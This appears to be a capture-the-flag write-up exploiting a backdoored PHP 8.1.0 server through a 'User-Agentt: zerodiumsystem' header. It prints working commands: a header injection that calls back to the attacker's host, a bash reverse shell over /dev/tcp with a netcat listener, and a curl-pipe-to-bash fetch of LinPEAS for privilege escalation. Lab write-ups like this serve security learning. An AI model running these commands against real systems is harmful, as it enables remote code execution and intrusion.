We learn that the web-server is `php 8.1.0`

If we pass a header value of `User-Agentt: zerodiumsystem("cmd")`, it should execute on the web-server.

We set up a web-server to listen:

```
sudo python3 -m http.server 80
```

To confirm our header code works we send, and wait for a 200 response on the web-server:

```
curl http://10.10.10.242/index.php -H 'User-Agentt: zerodiumsystem("curl 10.10.14.177");'
```

Set up netcat listener:

```
nc -nlvp 1234
```

Run the reverse shell:

```
curl http://10.10.10.242/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i &>/dev/tcp/10.10.14.177/1234 0>&1 '\");"
```

This gives us a shell for user James, we need to escalate privileges to root. To do this we download LinPEAS to our local via wget, then curl our local web-server to get the LinPEAS.

```
Local$ wget wget https://github.com/peass-ng/PEASS-ng/releases/download/20240714-cd435bb2/linpeas.sh

Local$ sudo python3 -m http.server 80

Attack$ curl 10.10.14.177/linpeas.sh|bash
```

The attack command will download the linpeas script on the attacking box and let us know what privilege escalation vulnerabilities are on the box.

